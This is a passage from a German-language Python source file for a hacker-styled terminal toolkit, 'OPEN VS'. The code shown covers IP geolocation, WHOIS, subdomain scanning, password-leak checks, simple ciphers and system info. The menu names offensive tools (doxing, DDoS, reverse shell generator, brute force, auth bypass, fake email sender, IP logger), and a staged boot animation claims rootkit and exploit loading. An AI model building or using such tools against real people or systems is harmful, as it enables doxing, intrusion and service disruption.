# -*- coding: utf-8 -*-
import os, sys, socket, json, re, hashlib, base64, time, platform, ssl
import urllib.request, urllib.error, urllib.parse, subprocess
import threading, string
from datetime import datetime

IS_WIN     = sys.platform == "win32"
IS_LINUX   = sys.platform.startswith("linux")
IS_ANDROID = IS_LINUX and "ANDROID_ROOT" in os.environ

# ── Farben ──────────────────────────────────────────────────
G   = "\033[92m"       # hellgrün
DG  = "\033[32m"       # dunkelgrün (Borders)
YG  = "\033[1;92m"     # bright-grün/gelb (Highlights)
R   = "\033[0m"        # reset
DIM = "\033[2;32m"     # gedimmtes grün
BLD = "\033[1;92m"     # fett hellgrün
C   = "\033[96m"       # cyan (ASCII-Art, Akzente)
LC  = "\033[36m"       # dunkelcyan (sekundärer Akzent)
M   = "\033[35m"       # magenta (seltene Highlights)


CONFIG_FILE = os.path.join(os.path.dirname(os.path.abspath(__file__)), "open_vs_config.json")

def load_config():
    try:
        with open(CONFIG_FILE, "r") as f:
            return json.load(f)
    except:
        return {}

def save_config(data):
    try:
        cfg = load_config()
        cfg.update(data)
        with open(CONFIG_FILE, "w") as f:
            json.dump(cfg, f, indent=2)
    except:
        pass

CONFIG = load_config()

# BANNER: OPEN VS — inner width 74
BANNER = (
    f"{DG}\n"
    f"  ╔{'═'*74}╗\n"
    f"  ║{C}          ██████╗ ██████╗ ███████╗███╗   ██╗    ██╗   ██╗███████╗         {DG}║\n"
    f"  ║{C}         ██╔═══██╗██╔══██╗██╔════╝████╗  ██║    ██║   ██║██╔════╝         {DG}║\n"
    f"  ║{C}         ██║   ██║██████╔╝█████╗  ██╔██╗ ██║    ██║   ██║███████╗         {DG}║\n"
    f"  ║{C}         ██║   ██║██╔═══╝ ██╔══╝  ██║╚██╗██║    ╚██╗ ██╔╝╚════██║         {DG}║\n"
    f"  ║{C}         ╚██████╔╝██║     ███████╗██║ ╚████║     ╚████╔╝ ███████║         {DG}║\n"
    f"  ║{C}          ╚═════╝ ╚═╝     ╚══════╝╚═╝  ╚═══╝      ╚═══╝  ╚══════╝         {DG}║\n"
    f"  ╠{'═'*74}╣\n"
    f"  ║  {DIM}OPEN VS{DG}  ·  {G}NET · OSINT · SEC · CRYPTO · SYS · DDoS · TOOLS{DG}                ║\n"
    f"  ╚{'═'*74}╝{R}"
)

# Alle Tools: (id, name, kategorie)
ALL_TOOLS = [
    ( "1",  "IP Lookup",                 "NET"),
    ( "2",  "WHOIS Lookup",              "NET"),
    ( "3",  "Website Lookup",            "NET"),
    ( "4",  "Subdomain Scanner",         "NET"),
    ("12",  "Meine öffentliche IP",      "NET"),
    ("13",  "Speed Test",                "NET"),
    ("14",  "DNS Lookup",                "NET"),
    ("15",  "Port Scanner",              "NET"),
    ("16",  "Ping Test",                 "NET"),
    ("22",  "Minecraft Server Lookup",   "NET"),
    ("23",  "MAC Lookup",                "NET"),
    ("24",  "Traceroute",                "NET"),
    ("29",  "Massen IP-Scan",            "NET"),
    ("42",  "Netzwerk-Scanner",          "NET"),
    ("43",  "Firewall-Tester",           "NET"),
    ("44",  "Banner Grabbing",           "NET"),
    ("21",  "DOX / OSINT",              "OSI"),
    ("26",  "GitHub User Lookup",        "OSI"),
    ("27",  "Steam Profil Lookup",       "OSI"),
    ("32",  "Discord Lookup",            "OSI"),
    ("33",  "Minecraft Account Lookup",  "OSI"),
    ("38",  "TikTok / Instagram Lookup", "OSI"),
    ("39",  "E-Mail OSINT",              "OSI"),
    ("40",  "Telefonnummer Lookup",      "OSI"),
    ("41",  "YouTube Kanal Lookup",      "OSI"),
    ( "5",  "Email Validator",           "SEC"),
    ( "6",  "Passwort Leak Check",       "SEC"),
    ("17",  "Passwort Checker",          "SEC"),
    ("18",  "Passwort Generator",        "SEC"),
    ("25",  "SSL Zertifikat Checker",    "SEC"),
    ("45",  "Passwort-Tresor",           "SEC"),
    ( "7",  "Text Verschlüsseln",        "CRY"),
    ( "8",  "Text zu Hash",              "CRY"),
    ( "9",  "Base64 En/Decoder",         "CRY"),
    ("19",  "File Hash Checker",         "CRY"),
    ("46",  "Text-Steganographie",       "CRY"),
    ("10",  "WiFi Info",                 "SYS"),
    ("11",  "CPU & RAM Monitor",         "SYS"),
    ("20",  "System Info",               "SYS"),
    ("36",  "Internet Verbindungs-Test", "DOS"),
    ("37",  "MC Server Health-Check",    "DOS"),
    ("28",  "QR-Code Generator",         "TLS"),
    ("30",  "Fake Identity Generator",   "TLS"),
    ("31",  "HACK SIMULATOR",            "TLS"),
    ("47",  "Fake E-Mail Sender",        "TLS"),
    ("48",  "URL Shortener",             "TLS"),
    ("49",  "IP Tracker Link",           "TLS"),
    ("50",  "Live Terminal Map",         "TLS"),
    ("51",  "IP Logger Server",          "DOS"),
    ("84",  "WiFi Scanner",             "NET"),
    ("52",  "Domain Checker",            "NET"),
    ("53",  "Fake Kreditkarte",          "TLS"),
    ("54",  "Morse Code",                "TLS"),
    ("55",  "ASCII Art Generator",       "TLS"),
    ("56",  "LAN Netzwerk-Karte",        "NET"),
    ("57",  "WiFi Passwörter",           "SYS"),
    ("58",  "Prozess Monitor",           "SYS"),
    ("59",  "Autostart Manager",         "SYS"),
    ("60",  "Username Checker",          "OSI"),
    ("61",  "IP Reputation / Blacklist",  "SEC"),
    ("62",  "Subdomain Brute-Force",     "NET"),
    ("63",  "Hash Cracker",              "CRY"),
    ("64",  "CVE Lookup",                "SEC"),
    ("65",  "HTTP Header Analyzer",      "NET"),
    ("66",  "JWT Decoder",               "CRY"),
    ("67",  "Leak Search",               "OSI"),
    ("68",  "Email Header Analyzer",     "SEC"),
    ("69",  "Tor/Proxy Checker",         "SEC"),
    ("70",  "Dir Brute-Force",            "NET"),
    ("71",  "Web Crawler",                "NET"),
    ("72",  "WAF Detector",               "NET"),
    ("73",  "Admin Panel Finder",         "NET"),
    ("74",  "crt.sh Subdomain Lookup",    "NET"),
    ("75",  "Robots.txt Inspector",       "NET"),
    ("76",  "Tech Fingerprinting",        "NET"),
    ("77",  "Reverse IP Lookup",          "OSI"),
    ("78",  "IDN Homograph Checker",      "SEC"),
    ("79",  "Cipher Tools",               "CRY"),
    ("80",  "Anonymity & DNS-Leak Test",  "SEC"),
    ("81",  "Malware Scanner",            "SEC"),
    ("82",  "Proxy / VPN Setup",          "SEC"),
    ("85",  "Vulnerability Scanner",     "SEC"),
    ("86",  "DNS Zone Transfer",         "NET"),
    ("87",  "Google Dork Generator",     "OSI"),
    ("88",  "CORS Checker",              "SEC"),
    ("90",  "Reverse Shell Generator",   "SEC"),
    ("91",  "Website Monitor",           "NET"),
    ("92",  "SPF / DMARC Checker",       "SEC"),
    ("93",  "Subdomain Takeover",        "NET"),
    ("94",  "Live Netzwerk-Stats",       "SYS"),
    ("95",  "Hash Identifier",           "CRY"),
    ("96",  "Payload Encoder",           "SEC"),
    ("97",  "Open Redirect Finder",      "SEC"),
    ("98",  "Full Tech Scanner",         "NET"),
    ("99",  "ARP Scanner",               "NET"),
    ("100", "HTTP Brute Force",          "SEC"),
    ("101", "Passwort Security Tester",  "SEC"),
    ("102", "Full Vuln Analyzer",        "SEC"),
    ("103", "Bypass Analyzer + Report", "SEC"),
    ("104", "Security Dashboard",       "SEC"),
    ("105", "MASTER SECURITY SCAN",    "SEC"),
    ("106", "DDoS / Stress Tester",    "DOS"),
    ("107", "Umgebungs-Scanner",       "SYS"),
    ("108", "JWT Analyzer",             "SEC"),
    ("109", "Secret Scanner",           "SEC"),
    ("110", "HTTP Headers Analyzer",    "SEC"),
    ("111", "API Security Tester",      "SEC"),
    ("112", "CORS Tester",              "SEC"),
    ("113", "Dependency Checker",       "SEC"),
    ("114", "SSL/TLS Deep Scanner",     "SEC"),
    ("115", "MC Server Security",       "NET"),
    ("116", "Admin Auth Bypass",         "SEC"),
]

CATEGORIES = [
    ("1", "NET", "NETWORK",     "IP, DNS, Port, Ping, Scan, Trace"),
    ("2", "OSI", "OSINT",       "DOX, GitHub, Steam, Discord, TikTok"),
    ("3", "SEC", "SECURITY",    "Passwort, Leaks, SSL, Tresor"),
    ("4", "CRY", "CRYPTO",      "Hash, Encrypt, Base64, Stegano"),
    ("5", "SYS", "SYSTEM",      "CPU, RAM, WiFi, System Info"),
    ("6", "DOS", "DDoS / STRESS","Flood, MC, HTTP, Internet, IP-Logger"),
    ("7", "TLS", "TOOLS",       "QR, Morse, ASCII Art, Fake ID"),
]

_TAG_COL = {
    "NET": "\033[38;5;45m",
    "OSI": "\033[38;5;214m",
    "SEC": "\033[38;5;196m",
    "CRY": "\033[38;5;141m",
    "SYS": "\033[38;5;51m",
    "DOS": "\033[38;5;196m",
    "TLS": "\033[38;5;246m",
    "   ": "\033[32m",
}

# ── Hilfsfunktionen ─────────────────────────────────────────
import random, shutil

def clear():
    os.system("cls" if os.name == "nt" else "clear")

def _cols():
    try: return shutil.get_terminal_size().columns
    except: return 80

def _type_out(text, delay=0.022):
    for ch in text:
        sys.stdout.write(ch); sys.stdout.flush()
        time.sleep(delay)
    print()

def _glitch_line(text, width=70):
    chars = list(text.ljust(width))
    glitch = "!@#$%^&*<>?/\\|~`"
    for _ in range(4):
        idx = random.randint(0, width-1)
        chars[idx] = random.choice(glitch)
    return "".join(chars[:width])

def _scan_line(width=70, delay=0.012, color=None):
    col = color or C
    bar = ""
    for i in range(width):
        bar += "─"
        sys.stdout.write(f"\r  {col}{bar}{R}")
        sys.stdout.flush()
        time.sleep(delay)
    sys.stdout.write(f"\r  {' '*width}\r")
    sys.stdout.flush()

def _matrix_rain(rows=8, cols=72, steps=18):
    import random
    chars = "アイウエオカキクケコサシスセソタチツテトナニヌネノ0123456789ABCDEF"
    lines = [[" "]*cols for _ in range(rows)]
    drops = [random.randint(0, rows-1) for _ in range(cols//2)]
    for _ in range(steps):
        clear()
        for r in range(rows):
            row_s = ""
            for c in range(cols):
                ch = lines[r][c]
                if ch != " ":
                    row_s += f"{DG}{ch}{R}"
                else:
                    row_s += " "
            print(f"  {row_s}")
        for col_i, drop_r in enumerate(drops):
            c = col_i * 2
            if c < cols:
                lines[drop_r][c] = random.choice(chars)
                drops[col_i] = (drop_r + 1) % rows
        time.sleep(0.04)

def _spinner(msg, duration=1.2):
    frames = ["⣾","⣽","⣻","⢿","⡿","⣟","⣯","⣷"]
    t_end = time.time() + duration
    i = 0
    while time.time() < t_end:
        sys.stdout.write(f"\r  {G}{frames[i%8]}{R}  {DG}{msg}{R}   ")
        sys.stdout.flush()
        time.sleep(0.08)
        i += 1
    sys.stdout.write(f"\r  {G}✔{R}  {G}{msg}{R}   \n")
    sys.stdout.flush()

def _progress_bar(label, steps=30, delay=0.03):
    for i in range(steps+1):
        pct  = i/steps*100
        fill = int(20*i/steps)
        bar  = f"{G}{'█'*fill}{DG}{'░'*(20-fill)}{R}"
        sys.stdout.write(f"\r  {DG}[{bar}{DG}]{R}  {G}{pct:5.1f}%{R}  {DG}{label}{R}   ")
        sys.stdout.flush()
        time.sleep(delay)
    print()

def _matrix_rain_pro(rows=18, cols=70, steps=35):
    """Matrix-Regen: grüne Drops mit cyan Lead-Char."""
    MC   = "\033[1;96m"   # cyan Lead (hell)
    TC   = "\033[96m"     # cyan Trail
    TG   = "\033[32m"     # grüner älterer Trail
    DIMC = "\033[2;32m"   # dunkler alter Trail
    chars = "アイウエオカキクケコサシスセソタチツテトナニヌネノ0123456789ABCDEF!@#<>|/\\"
    grid      = [[None]*cols for _ in range(rows)]
    speeds    = [random.uniform(0.35, 1.1) for _ in range(cols)]
    positions = [random.uniform(-rows, 0)  for _ in range(cols)]
    active    = [random.random() < 0.45    for _ in range(cols)]

    for step in range(steps):
        clear()
        for r in range(rows):
            for c in range(cols):
                if grid[r][c] is not None:
                    ch, age = grid[r][c]
                    if random.random() < 0.07:
                        ch = random.choice(chars)
                    grid[r][c] = (ch, age + 1)
        for c in range(cols):
            if not active[c]:
                if random.random() < 0.03:
                    active[c] = True; positions[c] = -1
                continue
            positions[c] += speeds[c]
            r = int(positions[c])
            if 0 <= r < rows:
                grid[r][c] = (random.choice(chars), 0)
            if r >= rows:
                active[c] = False
                positions[c] = random.uniform(-rows*2, -2)
        for r in range(rows):
            line = ""
            for c in range(cols):
                if grid[r][c] is None:
                    line += " "
                else:
                    ch, age = grid[r][c]
                    lead_r = int(positions[c])
                    if r == lead_r:
                        line += f"{MC}{ch}{R}"
                    elif age < 2:
                        line += f"{TC}{ch}{R}"
                    elif age < 5:
                        line += f"{TG}{ch}{R}"
                    elif age < 9:
                        line += f"{DIMC}{ch}{R}"
                    else:
                        grid[r][c] = None; line += " "
            print(f" {line}")
        time.sleep(0.042)

def _boot_anim():
    RED  = "\033[91m"
    BRED = "\033[1;91m"

    # Phase 1 — kurzer Matrix-Regen (reduziert)
    _matrix_rain_pro(rows=10, cols=70, steps=14)

    # Phase 2 — Glitch-Reveal (schneller, nur 5 Frames)
    banner_lines = BANNER.split("\n")
    glitch_chars = "!@#$%<>/\\|~`▓▒░█"
    for frame in range(5):
        clear()
        for line in banner_lines:
            clean = re.sub(r'\033\[[0-9;]*m', '', line)
            if not clean.strip():
                print(); continue
            if frame < 3:
                chars = list(clean)
                n_glitch = max(0, 18 - frame * 6)
                for _ in range(n_glitch):
                    i = random.randint(0, len(chars)-1)
                    if chars[i] not in (' ','║','╔','╗','╚','╝','═','╠','╣','─'):
                        chars[i] = random.choice(glitch_chars)
                col = RED if frame < 1 else (C if frame < 2 else G)
                print(f"{col}{''.join(chars)}{R}")
            else:
                print(line)
        time.sleep(0.035)

    # Phase 3 — Banner einrasten + roter Scan
    clear()
    print(BANNER)
    _scan_line(70, delay=0.002, color=RED)
    time.sleep(0.05)

    # Phase 4 — Gefährliche Boot-Sequenz (kurz + schnell)
    checks = [
        ("INIT",  "Injecting kernel rootkit module  ", RED),
        ("SOCK",  "Opening raw socket layer         ", G),
        ("ENC",   "AES-256 + RSA-4096 armed         ", C),
        ("AUTH",  "Authentication bypass — SUCCESS  ", BRED),
        ("EXPL",  "Loading 0-day exploit modules    ", RED),
        ("NET",   "Spoofing MAC + IP identity       ", G),
        ("DARK",  "Routing through darknet nodes    ", C),
        ("READY", "ALL SYSTEMS ARMED AND READY      ", BRED),
    ]
    W = 54
    print()
    print(f"  {RED}╔{'═'*W}╗{R}")
    title = "OPEN VS  //  INITIALIZING  //  ARMED"
    print(f"  {RED}║{R}  {BRED}{title:<{W-2}}{RED}║{R}")
    print(f"  {RED}╠{'═'*W}╣{R}")
    spin = ["⣾","⣽","⣻","⢿","⡿","⣟","⣯","⣷"]
    for tag, desc, col in checks:
        pad = W - len(desc) - 10
        for si in range(random.randint(3, 6)):
            sys.stdout.write(f"\r  {RED}║{R}  {RED}[{DIM}{spin[si%8]}···{RED}]{R}  {DIM}{desc}{' '*pad}{R}{RED}║{R}")
            sys.stdout.flush()
            time.sleep(0.04 + random.uniform(0, 0.05))
        sys.stdout.write(f"\r  {RED}║{R}  {RED}[{col}{tag:<4}{RED}]{R}  {col}{desc}{' '*pad}{R}{RED}║{R}\n")
        sys.stdout.flush()
    print(f"  {RED}╠{'═'*W}╣{R}")
    inner = W - 8
    for i in range(inner + 1):
        pct  = int(i / inner * 100)
        col  = RED if pct < 50 else (BRED if pct < 90 else C)
        fill = "█" * i; rest = "░" * (inner - i)
        sys.stdout.write(f"\r  {RED}║{R}  {col}{fill}{DIM}{rest}{R}  {BRED}{pct:3d}%{R}  {RED}║{R}")
        sys.stdout.flush()
        time.sleep(0.006)
    print()
    print(f"  {RED}╠{'═'*W}╣{R}")
    print(f"  {RED}║{R}  {BRED}{'SYSTEM ARMED  ///  TARGET ACQUIRED  ///  READY':<{W-2}}{RED}║{R}")
    print(f"  {RED}╚{'═'*W}╝{R}")
    time.sleep(0.5)

def hdr(title=""):
    clear()
    print(BANNER)
    now  = datetime.now().strftime("%Y-%m-%d  %H:%M:%S")
    node = platform.node()
    W    = 74
    status = f"  {DIM}NODE{R} {DG}:{R} {G}{node:<18}{R}  {DIM}TIME{R} {DG}:{R} {G}{now}{R}  {DIM}VER{R} {DG}:{R} {G}VS{R}"
    print(f"  {DG}╔{'═'*W}╗{R}")
    print(f"  {DG}║{R}{_pad(status, W)}{DG}║{R}")
    print(f"  {DG}╚{'═'*W}╝{R}")
    if title:
        print()
        _scan_line(W, delay=0.004, color=DG)
        inner = f"  {YG}{title.upper()}"
        print(f"  {DG}╔{'═'*W}╗{R}")
        print(f"  {DG}║{R}{_pad(inner, W)}{DG}║{R}")
        print(f"  {DG}╚{'═'*W}╝{R}\n")

def div():
    print(f"\n  {DG}{'╌'*68}{R}\n")

def inp(label):
    print(f"\n  {DG}┌{'─'*52}┐{R}")
    print(f"  {DG}│{R}  {DIM}{label}{R}")
    print(f"  {DG}└──►{R} ", end="")
    return input(f"{G}").strip()

def wait():
    input(f"\n  {DG}╘══[{G} ENTER {DG}]══════════════════════════════════════╛{R}")

def row(key, val, w=20):
    print(f"  {DG}{key:<{w}}{R} {G}{val}{R}")

def bar(pct, width=24):
    filled = int(width * min(pct, 100) / 100)
    return f"{G}{'█'*filled}{'░'*(width-filled)}{R}"

_PROXY_URL = CONFIG.get("proxy_url", "")  # z.B. "http://127.0.0.1:8118" oder "socks5://127.0.0.1:9050"

def _build_opener(proxy_url=""):
    """Baut urllib-Opener mit optionalem Proxy."""
    url = proxy_url or _PROXY_URL
    if not url:
        return urllib.request.build_opener()
    # SOCKS5 via PySocks (falls installiert)
    if url.startswith("socks"):
        try:
            import socks as _socks
            import urllib.request as _ur
            host, port = url.split("://",1)[1].rsplit(":",1)
            port = int(port)
            stype = _socks.SOCKS5 if "socks5" in url else _socks.SOCKS4
            class _SocksHandler(_ur.HTTPHandler, _ur.HTTPSHandler):
                def http_open(self, req):
                    s = _socks.socksocket()
                    s.set_proxy(stype, host, port)
                    return self.do_open(lambda *a, **kw: s, req)
            return _ur.build_opener(_SocksHandler)
        except ImportError:
            pass  # PySocks nicht installiert → HTTP-Proxy versuchen
    # HTTP/HTTPS Proxy (nativ in urllib)
    ph = urllib.request.ProxyHandler({"http": url, "https": url})
    return urllib.request.build_opener(ph)

def get(url, timeout=10, headers=None):
    h = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"}
    if headers:
        h.update(headers)
    req = urllib.request.Request(url, headers=h)
    opener = _build_opener()
    with opener.open(req, timeout=timeout) as r:
        return r.read().decode("utf-8", errors="ignore"), r.status, dict(r.headers)

def getj(url, timeout=10, headers=None):
    body, _, _ = get(url, timeout, headers)
    return json.loads(body)

def ps(cmd):
    try:
        return subprocess.check_output(
            ["powershell", "-NoProfile", "-NonInteractive", "-Command", cmd],
            stderr=subprocess.DEVNULL
        ).decode("utf-8", errors="ignore").strip()
    except Exception:
        return ""

# ════════════════════════════════════════════════════════════
#  FEATURES
# ════════════════════════════════════════════════════════════

# ── 1  IP LOOKUP ────────────────────────────────────────────
def ip_lookup():
    hdr("IP LOOKUP")
    t = inp("IP-Adresse (leer = eigene)")
    url = f"http://ip-api.com/json/{t}?fields=66846719" if t else "http://ip-api.com/json/?fields=66846719"
    try:
        d = getj(url)
        div()
        row("IP",          d.get("query","?"))
        row("Hostname",    d.get("reverse","?"))
        row("Land",        f"{d.get('country','?')} ({d.get('countryCode','?')})")
        row("Region",      d.get("regionName","?"))
        row("Stadt",       d.get("city","?"))
        row("ZIP",         d.get("zip","?"))
        row("Koordinaten", f"{d.get('lat','?')} / {d.get('lon','?')}")
        row("Zeitzone",    d.get("timezone","?"))
        row("ISP",         d.get("isp","?"))
        row("Org",         d.get("org","?"))
        row("AS",          d.get("as","?"))
        row("Proxy",       "JA ⚠" if d.get("proxy") else "Nein")
        row("VPN",         "JA ⚠" if d.get("vpn")   else "Nein")
        row("Tor",         "JA ⚠" if d.get("tor")   else "Nein")
        row("Mobile",      "Ja"   if d.get("mobile") else "Nein")
        lat, lon = d.get("lat",""), d.get("lon","")
        if lat:
            print(f"\n  {DG}Maps{R}  {G}https://maps.google.com/?q={lat},{lon}{R}")
    except Exception as e:
        print(f"\n  {G}[!] {e}{R}")
    wait()

# ── 2  WHOIS ────────────────────────────────────────────────
def whois_lookup():
    hdr("WHOIS LOOKUP")
    t = inp("Domain")
    host = re.sub(r"https?://","",t).split("/")[0].strip()
    tld  = host.rsplit(".",1)[-1] if "." in host else "com"
    servers = {"com":"whois.verisign-grs.com","net":"whois.verisign-grs.com",
               "org":"whois.pir.org","io":"whois.nic.io","de":"whois.denic.de",
               "uk":"whois.nic.uk","co":"whois.nic.co","dev":"whois.nic.google"}
    server = servers.get(tld, f"whois.nic.{tld}")
    div()
    try:
        s = socket.socket(); s.settimeout(12); s.connect((server, 43))
        s.sendall((host+"\r\n").encode())
        out = b""
        while True:
            c = s.recv(4096)
            if not c: break
            out += c
        s.close()
        lines = out.decode("utf-8", errors="ignore").splitlines()
        for line in lines[:80]:
            if line.strip(): print(f"  {G}{line}{R}")
    except Exception as e:
        print(f"  {G}[!] {e}{R}")
    wait()

# ── 3  WEBSITE LOOKUP ───────────────────────────────────────
def website_lookup():
    hdr("WEBSITE LOOKUP")
    t    = inp("Domain oder URL")
    host = re.sub(r"https?://","",t).split("/")[0].strip()
    div()
    try:
        ip = socket.gethostbyname(host)
        row("Host", host)
        row("IP",   ip)
        all_ips = list(set(a[4][0] for a in socket.getaddrinfo(host, None)))
        if len(all_ips) > 1:
            row("Alle IPs", ", ".join(all_ips))
    except Exception as e:
        print(f"  {G}[!] DNS: {e}{R}"); wait(); return

    for scheme in ("https","http"):
        try:
            body, status, h = get(f"{scheme}://{host}", timeout=8)
            row("Status",   str(status))
            for k in ("Server","X-Powered-By","Content-Type","X-Frame-Options",
                      "Strict-Transport-Security","Content-Security-Policy"):
                if k in h: row(k, h[k][:80])
            if "wordpress" in body.lower(): row("CMS","WordPress erkannt")
            if "drupal"    in body.lower(): row("CMS","Drupal erkannt")
            if "joomla"    in body.lower(): row("CMS","Joomla erkannt")
            break
        except: pass
    wait()

# ── 4  SUBDOMAIN SCANNER ────────────────────────────────────
def subdomain_scanner():
    hdr("SUBDOMAIN SCANNER")
    t    = inp("Domain (z.B. example.com)")
    host = re.sub(r"https?://","",t).split("/")[0].strip()
    wl = ["www","mail","ftp","smtp","pop","imap","webmail","admin","portal","api",
          "dev","staging","test","shop","blog","forum","support","help","docs",
          "cdn","static","assets","media","img","vpn","remote","ns1","ns2","mx",
          "m","mobile","app","login","auth","sso","beta","old","secure","panel",
          "cpanel","dashboard","status","git","gitlab","ci","cloud","video","pay"]
    div()
    print(f"  {DG}Scanne {len(wl)} Subdomains für {host} ...{R}\n")
    found = []
    for sub in wl:
        fqdn = f"{sub}.{host}"
        try:
            ip2 = socket.gethostbyname(fqdn)
            print(f"  {G}[+] {fqdn:<42} → {ip2}{R}")
            found.append(fqdn)
        except:
            print(f"  {DG}[-] {fqdn}{R}", end="\r")
    print()
    div()
    print(f"  {YG}{len(found)} Subdomain(s) gefunden.{R}")
    wait()

# ── 5  EMAIL VALIDATOR ──────────────────────────────────────
def email_validator():
    hdr("EMAIL VALIDATOR")
    email = inp("E-Mail-Adresse")
    div()
    if not re.match(r'^[a-zA-Z0-9._%+\-]+@[a-zA-Z0-9.\-]+\.[a-zA-Z]{2,}$', email):
        print(f"  {G}[✗] Ungültiges Format{R}"); wait(); return
    print(f"  {G}[✓] Format OK{R}")
    domain = email.split("@")[1]
    try:
        socket.getaddrinfo(domain, None)
        print(f"  {G}[✓] Domain erreichbar: {domain}{R}")
    except:
        print(f"  {G}[✗] Domain nicht erreichbar{R}")
    trash = {"mailinator.com","guerrillamail.com","temp-mail.org","yopmail.com",
             "throwam.com","10minutemail.com","trashmail.com","fakeinbox.com",
             "sharklasers.com","dispostable.com","mailnull.com","spamgourmet.com"}
    if domain.lower() in trash:
        print(f"  {G}[!] Wegwerf-Domain erkannt!{R}")
    else:
        print(f"  {G}[✓] Keine bekannte Wegwerf-Domain{R}")
    wait()

# ── 6  PASSWORT LEAK CHECK ──────────────────────────────────
def pwleak_check():
    hdr("PASSWORT LEAK CHECK")
    pw     = inp("Passwort")
    sha1   = hashlib.sha1(pw.encode()).hexdigest().upper()
    prefix, suffix = sha1[:5], sha1[5:]
    div()
    try:
        body, _, _ = get(f"https://api.pwnedpasswords.com/range/{prefix}",
                         headers={"Add-Padding":"true"})
        hashes = {}
        for line in body.splitlines():
            parts = line.split(":")
            if len(parts) == 2:
                hashes[parts[0].strip()] = int(parts[1].strip())
        count = hashes.get(suffix, 0)
        if count:
            print(f"  {G}[!] GELEAKT — {count:,}× in Datenlecks gefunden!{R}")
        else:
            print(f"  {G}[✓] Nicht in bekannten Datenlecks gefunden.{R}")
    except Exception as e:
        print(f"  {G}[!] {e}{R}")
    wait()

# ── 7  TEXT VERSCHLÜSSELN ───────────────────────────────────
def text_encrypt():
    hdr("TEXT VERSCHLÜSSELN")
    print(f"  {DG}1{R} {G}» ROT13{R}")
    print(f"  {DG}2{R} {G}» Caesar{R}")
    print(f"  {DG}3{R} {G}» XOR{R}")
    mode = inp("Methode (1/2/3)")
    text = inp("Text")
    div()
    if mode == "1":
        out = text.translate(str.maketrans(
            "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz",
            "NOPQRSTUVWXYZABCDEFGHIJKLMnopqrstuvwxyzabcdefghijklm"))
        print(f"  {G}{out}{R}")
    elif mode == "2":
        n = inp("Verschiebung")
        n = int(n) if n.lstrip("-").isdigit() else 13
        out = ""
        for c in text:
            if c.isalpha():
                b = ord("A") if c.isupper() else ord("a")
                out += chr((ord(c)-b+n) % 26 + b)
            else:
                out += c
        print(f"  {G}{out}{R}")
    elif mode == "3":
        key = inp("XOR-Key")
        if not key: key = "x"
        out = bytes(ord(c)^ord(key[i%len(key)]) for i,c in enumerate(text))
        print(f"  {G}HEX: {out.hex()}{R}")
    wait()

# ── 8  TEXT ZU HASH ─────────────────────────────────────────
def text_hash():
    hdr("TEXT ZU HASH")
    text = inp("Text")
    div()
    enc = text.encode()
    for algo in ("md5","sha1","sha224","sha256","sha384","sha512"):
        row(algo.upper(), hashlib.new(algo, enc).hexdigest())
    wait()

# ── 9  BASE64 ───────────────────────────────────────────────
def base64_tool():
    hdr("BASE64 EN/DECODER")
    print(f"  {DG}1{R} {G}» Encode   2 » Decode{R}")
    mode = inp("Modus")
    text = inp("Text")
    div()
    try:
        if mode == "1":
            print(f"  {G}{base64.b64encode(text.encode()).decode()}{R}")
        else:
            # padding fix
            padded = text + "=" * (-len(text) % 4)
            print(f"  {G}{base64.b64decode(padded).decode('utf-8', errors='replace')}{R}")
    except Exception as e:
        print(f"  {G}[!] {e}{R}")
    wait()

# ── 10  WIFI INFO ────────────────────────────────────────────
def wifi_info():
    hdr("WIFI INFO")
    div()
    if os.name == "nt":
        try:
            raw = ps("netsh wlan show interfaces")
            if not raw.strip():
                print(f"  {G}[!] Kein WLAN-Adapter gefunden.{R}")
                wait(); return
            keep = ("SSID","Signal","Authentifizierung","Verschlüsselung",
                    "Kanal","Empfangsrate","Übertragungsrate","Profil",
                    "Zustand","Funk","BSSID")
            for line in raw.splitlines():
                s = line.strip()
                if not s: continue
                for k in keep:
                    if s.lower().startswith(k.lower()):
                        key, _, val = s.partition(":")
                        row(key.strip(), val.strip())
                        break
        except Exception as e:
            print(f"  {G}[!] {e}{R}")
    else:
        try:
            out = subprocess.check_output(["iwconfig"],
                  stderr=subprocess.DEVNULL).decode(errors="ignore")
            for line in out.splitlines():
                if line.strip(): print(f"  {G}{line}{R}")
        except Exception as e:
            print(f"  {G}[!] {e}{R}")
    wait()

# ── 11  CPU & RAM MONITOR ────────────────────────────────────
def cpu_ram():
    hdr("CPU & RAM MONITOR")
    div()

    # psutil (beste Methode)
    try:
        import psutil
        print(f"  {DG}Live-Monitor — 10 Sekunden:{R}\n")
        for _ in range(10):
            c   = psutil.cpu_percent(interval=1)
            ram = psutil.virtual_memory()
            print(f"\r  {DG}CPU{R} [{bar(c)}] {G}{c:5.1f}%{R}   "
                  f"{DG}RAM{R} [{bar(ram.percent)}] "
                  f"{G}{ram.percent:5.1f}%  "
                  f"{ram.used//1024**2}MB/{ram.total//1024**2}MB{R}   ",
                  end="", flush=True)
        print("\n")
        div()
        row("CPU-Kerne",    f"{psutil.cpu_count(logical=False)} physisch / {psutil.cpu_count()} logisch")
        freq = psutil.cpu_freq()
        if freq:
            row("CPU-Frequenz", f"{freq.current:.0f} MHz  (max {freq.max:.0f} MHz)")
        disk = psutil.disk_usage("/" if os.name != "nt" else "C:\\")
        used_gb  = disk.used  / 1024**3
        total_gb = disk.total / 1024**3
        row("Festplatte C:", f"[{bar(disk.percent, 20)}] {used_gb:.1f}GB / {total_gb:.1f}GB ({disk.percent}%)")
        wait(); return
    except ImportError:
        pass

    # PowerShell Fallback (Windows ohne psutil)
    if os.name == "nt":
        try:
            cpu_pct = float(ps(
                "(Get-WmiObject Win32_Processor | "
                "Measure-Object -Property LoadPercentage -Average).Average"
            ) or 0)
            ram_info = ps(
                "$o=Get-WmiObject Win32_OperatingSystem;"
                "$u=[math]::Round(($o.TotalVisibleMemorySize-$o.FreePhysicalMemory)/1KB,0);"
                "$t=[math]::Round($o.TotalVisibleMemorySize/1KB,0);"
                "$p=[math]::Round(($o.TotalVisibleMemorySize-$o.FreePhysicalMemory)/"
                "$o.TotalVisibleMemorySize*100,1);"
                "\"$u $t $p\""
            ).split()
            ram_used, ram_total, ram_pct = int(ram_info[0]), int(ram_info[1]), float(ram_info[2])
            row("CPU", f"[{bar(cpu_pct)}] {cpu_pct:.1f}%")
            row("RAM", f"[{bar(ram_pct)}] {ram_pct}%  {ram_used}MB / {ram_total}MB")
            disk_info = ps(
                "$d=Get-PSDrive C;"
